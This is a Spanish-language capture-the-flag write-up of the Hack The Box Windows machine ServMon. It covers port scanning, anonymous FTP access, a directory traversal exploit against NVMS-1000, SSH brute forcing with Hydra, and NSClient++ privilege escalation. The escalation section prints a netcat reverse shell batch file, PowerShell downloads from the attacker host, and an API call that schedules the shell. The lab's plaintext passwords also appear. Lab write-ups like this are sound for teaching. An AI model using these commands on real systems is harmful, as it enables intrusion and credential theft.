---
layout: single
title: ServMon - Hack The Box
excerpt: "ServMon es una máquina Windows de dificultad fácil en la cual se va a explotar una vulnerabilidad en TVT NVMS 1000 (CVE-2019-20085) y en la fase de escalamiento de privilegios una vulnerabilidad en NSClient++ 0.5.2.35."
date: 2020-06-20
classes: wide
header:
  teaser: /assets/images/hack-the-box/servmon_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - FTP
  - Hydra
  - SSH
  - NSClient++
---

<p align="center">
<img src="/assets/images/hack-the-box/servmon_logo.png">
</p>

ServMon es una máquina Windows de dificultad fácil en la cual se va a explotar una vulnerabilidad en TVT NVMS 1000 (CVE-2019-20085) y en la fase de escalamiento de privilegios una vulnerabilidad en NSClient++ 0.5.2.35.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 servmon.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n servmon.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/ServMon/nmap# nmap -p- --open -T5 -v -n servmon.htb -oG all-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:53 EDT

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
6063/tcp  open  x11
6699/tcp  open  napster
7680/tcp  open  pando-pub
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p445,139,21,22,80,135,49665,6699,49670,49669,49668,49666,49667,7680,8443,5040,6063,49664 servmon.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/ServMon/nmap# nmap -sC -sV -p445,139,21,22,80,135,49665,6699,49670,49669,49668,49666,49667,7680,8443,5040,6063,49664 servmon.htb -oN targeted.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:56 EDT
Nmap scan report for servmon.htb (10.10.10.184)
Host is up (0.21s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
8443/tcp  open  ssl/https-alt
| http-title: NSClient++
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: 1m11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-17T16:00:06
|_  start_date: N/A
```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 21 (FTP File Transfer Protocol):` transferencia de archivos entre sistemas conectados a una red TCP.
- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de manera segura.
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.
- `Puerto 445 (Samba):` compartir archivos a través de una red TCP/IP Windows.

### Enumeración FTP

Observando el output de nmap encontramos que en el puerto 21 se puede ingresar de manera anónima.

```console
root@kali:/home/kali# ftp servmon.htb
Connected to servmon.htb.
220 Microsoft FTP Service
Name (servmon.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

Una vez dentro del sistema, encontramos el nombre de dos usuarios `Nadine` y `Nathan`

```console
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
```

Dentro del directorio de Nadine hay un archivo llamado `Confidential.txt`, así que procedemos a descargarlo en nuestra máquina.

```console
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> mget Confidential.txt
mget Confidential.txt? yes
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 3.09 secs (0.0549 kB/s)
```

El contenido del archivo es:
```console
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

### HTTP

Se procede a entrar al sitio web encontramos `NVMS-1000` que es un cliente de videovigilancia en red. Buscando en [Exploit-db](https://www.exploit-db.com/exploits/48311) este cliente es vulnerable a ataques de directorio trasversal.

Este exploit aprovecha la vulnerabilidad de `directorio transversal` la cual permite acceder a cualquier tipo de directorio o archivos sensibles.


## Explotación

En el archivo `Confidential.txt` que encontramos en el directorio de `Nadine` en el FTP nos informa que en el escritorio de `Nathan` se encuentra el archivo `Passwords.txt`. Así que utilizando el exploit que se descargó anteriormente,  vamos a obtener la información que hay en el archivo.

```python
python exploit.py http://servmon.htb users/nathan/passwords.txt passwords.txt
```

Ahora, conociendo el nombre de dos usuarios `Nadine` y `Nathan` y contraseñas, vamos a hacer uso de la herramienta Hydra para realizar un ataque de fuerza bruta para ingresar vía SSH. Para esto, además del archivo `passwords.txt` vamos a crear un archivo `users.txt` con los dos usuarios encontrados en FTP.

```console
root@kali:/home/kali/Documents/HTB/Machines/ServMon/content# hydra -L users.txt -P passwords.txt servmon.htb ssh
Hydra v9.0 (c) 2019 by van Hauser/THC

[DATA] attacking ssh://servmon.htb:22/
[22][ssh] host: servmon.htb   login: nadine   password: L1k3B1gBut7s@W0rk
```
Ahora ingresamos con las credenciales del usuario y obtenemos el flag del user.

```console
root@kali:/home/kali# ssh nadine@servmon.htb
nadine@servmon.htb's password: 

Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
nadine@SERVMON C:\Users\Nadine>cd Desktop                                  
nadine@SERVMON C:\Users\Nadine>type user.txt 
cb1df8..........................
```


## Escalamiento de privilegios

Enumerando todos los directorios a los que el usuario tiene acceso encontramos una contraseña en el archivo `nsclient.ini`

```console
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini

; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```

En exploit-db se encuentra un exploit de [NSClient++ 0.5.2.35 - Privilege Escalation](https://www.exploit-db.com/exploits/46802) así que vamos a seguir paso a paso lo que nos dice.

Creamos un archivo en batch llamado `evil.bat` con el siguiente código:

```batch
@echo off
c:\temp\nc.exe 10.10.14.43 443 -e cmd.exe
```

Primero nos ubicamos en el directorio donde están los archivos `nc.exe` y `evil.bat` y creamos un servidor http con python `python -m SimpleHTTPServer 80`

Luego enviamos los archivos `nc.exe`  y `evil.bat` a la máquina de ServMon.

```console
nadine@SERVMON C:\>powershell.exe wget "http://10.10.14.43/nc.exe" -outfile "c:\temp\nc.exe"

nadine@SERVMON C:\>powershell.exe wget "http://10.10.14.43/evil.bat" -outfile "c:\temp\evil.bat"
```

En el Kali creamos una sesión con netcat en el puerto 443 y lo dejamos en modo escucha

```console
root@kali:~# nc -lvnp 443
listening on [any] 443 ...
```

Leyendo la documentación de [NSClient++ API](https://docs.nsclient.org/api/) podemos hacer peticiones `PUT` pasándole los parámetros que deseamos. En este caso debemos agregar un script que llame al archivo `evil.bat`

```console
nadine@SERVMON C:\Temp> curl -k -i -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.x.x 443 -e cmd.exe"
```

Luego agregamos el scheduler con intervalo de 1m para que llame al script que acabamos de crear cada minuto..

```bash
nadine@SERVMON C:\Temp> curl -k -i -u admin https://127.0.0.1:8443/api/v1/queries/foobar?time=1m
```

Esperamos un par de segundos y revisamos la shelll reversa y ya debemos estar como administrador para finalmente obtener la flag del root.

```bash
connect to [10.10.14.43] from (UNKNOWN) [10.10.14.43] 49671
Microsoft Windows [Version 10.0.18363.752]          
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
```
